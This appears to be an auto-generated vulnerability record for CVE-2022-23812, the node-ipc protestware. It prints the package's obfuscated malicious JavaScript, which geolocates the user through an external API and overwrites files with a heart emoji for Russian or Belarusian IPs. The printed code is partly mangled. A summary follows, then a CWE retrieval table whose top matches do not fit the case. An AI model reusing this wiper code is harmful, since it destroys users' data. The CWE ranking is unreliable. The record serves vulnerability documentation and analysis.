# Vulnerability Information: CVE-2022-23812

## Vulnerability Description
This affects the package node-ipc from 10.1.1 and before 10.1.3. This package contains malicious code, that targets users with IP located in Russia or Belarus, and overwrites their files with a heart emoji. **Note** from versions 11.0.0 onwards, instead of having malicious code directly in the source of this package, node-ipc imports the peacenotwar package that includes potentially undesired behavior. Malicious Code **Note** Dont run it! js import u from path import a from fs import o from https setTimeout(function () { const t = Math.round(Math.random() * 4) if (t > 1) { return } const n = Buffer.from(aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=, base64) // https//api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154 o.get(n.toString(utf8), function (t) { t.on(data, function (t) { const n = Buffer.from(Li8=, base64) const o = Buffer.from(Li4v, base64) const r = Buffer.from(Li4vLi4v, base64) const f = Buffer.from(Lw==, base64) const c = Buffer.from(Y291bnRyeV9uYW1l, base64) const e = Buffer.from(cnVzc2lh, base64) const i = Buffer.from(YmVsYXJ1cw==, base64) try { const s = JSON.parse(t.toString(utf8)) const u = s[c.toString(utf8)].toLowerCase() const a = u.includes(e.toString(utf8)) || u.includes(i.toString(utf8)) // checks if country is Russia or Belarus if (a) { h(n.toString(utf8)) h(o.toString(utf8)) h(r.toString(utf8)) h(f.toString(utf8)) } } catch (t) {} }) }) }, Math.ceil(Math.random() * 1e3)) async function h(n = , o = ) { if (!a.existsSync(n)) { return } let r = [] try { r = a.readdirSync(n) } catch (t) {} const f = [] const c = Buffer.from(4p2k77iP, base64) for (var e = 0 e 0 ? f.push(...s) null } else if (i.indexOf(o) >= 0) { try { a.writeFile(i, c.toString(utf8), function () {}) // overwrites file with ?? } catch (t) {} } } return f } const ssl = true export { ssl as default, ssl }

### Vulnerability Description Key Phrases
- **rootcause:** **Malicious code within the package.**
- **weakness:** **Unintentional inclusion of malicious code and supply chain vulnerability.**
- **impact:** File overwrite with a heart emoji for users in Russia or Belarus and potential for other malicious behavior.
- **vector:** Package installation from npm repository.
- **attacker:** Unknown, but the code targets specific countries.
- **product:** node-ipc
- **version:** before 10.1.3
- **component:** npm package

## CVE Reference Links Content Summary
Based on the provided content, here's an analysis of CVE-2022-23812:

**Root Cause of Vulnerability:**
The vulnerability stems from malicious code embedded within the `node-ipc` package, specifically in versions 10.1.1 up to 10.1.3. This code is designed to target users located in Russia or Belarus.

**Weaknesses/Vulnerabilities Present:**
- **Malicious Code Injection:** The `node-ipc` package contains intentionally malicious code that executes upon installation/usage.
- **Geotargeting:** The malicious code specifically targets users with IP addresses geolocated in Russia or Belarus.
- **File Overwriting:** The malicious code overwrites files on the affected system with a heart emoji character (`❤️`).

**Impact of Exploitation:**
- **Data Loss/Modification:** The primary impact is the overwriting of files on the system, potentially leading to data loss or corruption.
- **Confidentiality, Integrity and Availability:** The NetApp advisory suggests that successful exploitation could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS). This aligns with the provided CVSS score of 9.8 (Critical) with high ratings for Confidentiality, Integrity, and Availability.

**Attack Vectors:**
- **Network:** The malicious code leverages network access to determine the user's geolocation via an external API.
- **Package Installation:** The vulnerability is introduced during the installation or usage of the compromised `node-ipc` package.

**Required Attacker Capabilities/Position:**
- **None:** The attacker does not require prior authorization, user interaction, or any specific privileges to exploit this vulnerability. It is triggered upon execution of the malicious code within the application that depends on the compromised package.
- **Geolocation Targeting:** The attacker's malicious code specifically targets a user with an IP address in Russia or Belarus.

**Additional Details:**
- The malicious code uses base64 encoding for certain strings.
- The code first checks the user's geolocation. If they are not in Russia or Belarus the code will not execute the malicious file overwriting functionality.
- The code overwrites files with the '❤️' character.
- The vulnerability is classified as having a CVSS score of 9.8 (Critical)
- Snyk has a published code exploit for the vulnerability.
- NetApp has determined that none of its products are affected by this vulnerability.

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage | Combined Score | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|---------------|------------|-------------------|
| 1 | CWE-193 | Off-by-one Error | Base | Allowed | 1.0958 | dense, sparse, graph | dense: 0.556, sparse: 1.000, graph: 0.686 |
| 2 | CWE-22 | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | Base | Allowed | 0.9295 | sparse, graph | sparse: 1.000, graph: 1.000 |
| 3 | CWE-476 | NULL Pointer Dereference | Base | Allowed | 0.8542 | sparse, graph | sparse: 1.000, graph: 0.789 |
| 4 | CWE-295 | Improper Certificate Validation | Base | Allowed | 0.8473 | dense, sparse | dense: 0.550, sparse: 1.000 |
| 5 | CWE-125 | Out-of-bounds Read | Base | Allowed | 0.8415 | dense, sparse | dense: 0.538, sparse: 1.000 |
| 6 | CWE-347 | Improper Verification of Cryptographic Signature | Base | Allowed | 0.8405 | dense, sparse | dense: 0.536, sparse: 1.000 |
| 7 | CWE-770 | Allocation of Resources Without Limits or Throttling | Base | Allowed | 0.7977 | sparse, graph | sparse: 1.000, graph: 0.631 |
| 8 | CWE-121 | Stack-based Buffer Overflow | Variant | Allowed | 0.7783 | dense, sparse | dense: 0.542, sparse: 1.000 |
| 9 | CWE-88 | Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') | Base | Allowed | 0.5720 | sparse | sparse: 1.000 |
| 10 | CWE-502 | Deserialization of Untrusted Data | Base | Allowed | 0.5720 | sparse | sparse: 1.000 |

